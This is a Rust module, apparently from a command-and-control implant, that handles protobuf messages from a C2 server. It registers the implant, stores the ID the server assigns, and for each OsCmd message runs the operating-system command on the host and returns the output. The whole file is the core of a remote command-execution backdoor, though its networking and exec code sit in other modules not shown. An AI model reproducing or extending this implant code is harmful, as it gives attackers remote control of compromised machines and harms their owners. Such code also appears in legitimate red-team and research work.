//! Handle protbuf messages

use prost::Message;
use crate::pb::{self, message::MessageType, error::ErrorType};
use crate::tasks;
use std::sync::mpsc;

enum Status {
    Unregistered,
    Registered(String)
}

/// Receive messages and send results
pub struct Handler {
    /// Is this implant registered?
    status: Status,
    /// Receive messages from the server
    rx: mpsc::Receiver<pb::Message>,
    /// Send messages to the server
    tx: mpsc::Sender<pb::Message>
}

impl Handler {
    pub fn new(rx: mpsc::Receiver<pb::Message>, tx: mpsc::Sender<pb::Message>) -> Handler {
        Handler {
            status: Status::Unregistered,
            rx,
            tx
        }
    }

    /// Receiver protbuf packets and run the tasks
    pub fn start(&mut self) {
        // let mut start = Instant::now();
        self.tx.send(self.register()).unwrap();
        while let Ok(message) = self.rx.recv() {
            // Decode protobuf message from the C2 Server
            match &self.status {
                // Handle confirmation
                Status::Unregistered => {
                    self.handle_confirmation(message);
                }
                Status::Registered(_id) => {
                    let message = self.handle_message_authed(message);
                    self.tx.send(message).unwrap();
                }
            }
        }
    }

    // Try to register
    fn register(&self) -> pb::Message {
        pb::Message {
            message_type: pb::message::MessageType::Registration.into(),
            data: tasks::register().unwrap().encode_to_vec()
        }
    }

    fn handle_confirmation(&mut self, message: pb::Message) {
        if message.message_type() == MessageType::RegistrationConfirmation {
            let buf = message.data.as_slice();
            if let Ok(confirmation) = pb::RegistrationConfirmation::decode(buf) {
                self.status = Status::Registered(confirmation.id);
            }
        }
    }

    // Handle a message from the server as an active implant
    fn handle_message_authed(&self, message: pb::Message) -> pb::Message {
        let buf = message.data.as_slice();
        let (message_type, data) = match message.message_type() {
            MessageType::OsCmd => {
                match self.handle_cmd(buf) {
                    Ok(output) => (MessageType::OsCmdOutput.into(), output.encode_to_vec()),
                    Err(e) => (MessageType::Error.into(), e.encode_to_vec())
                }
            }
            _ => (MessageType::Error.into(), pb::Error {
                    error_type: ErrorType::MessageDecode.into(),
                    message: String::from("unimplemented")
                }.encode_to_vec()
            )
        };

        pb::Message {
            message_type,
            data
        }
    }

    // Run an OS command
    fn handle_cmd(&self, buf: &[u8]) -> Result<pb::OsCmdOutput, pb::Error> {
        // Decode the message
        let os_cmd = pb::OsCmd::decode(buf)
            .map_err(|e| pb::Error {
                error_type: ErrorType::MessageDecode.into(),
                message: e.to_string()
            })?;

        // Execute the command
        tasks::exec(os_cmd)
            .map_err(|e| pb::Error {
                error_type: ErrorType::OsCmd.into(),
                message: e.to_string()
            })
    }
}
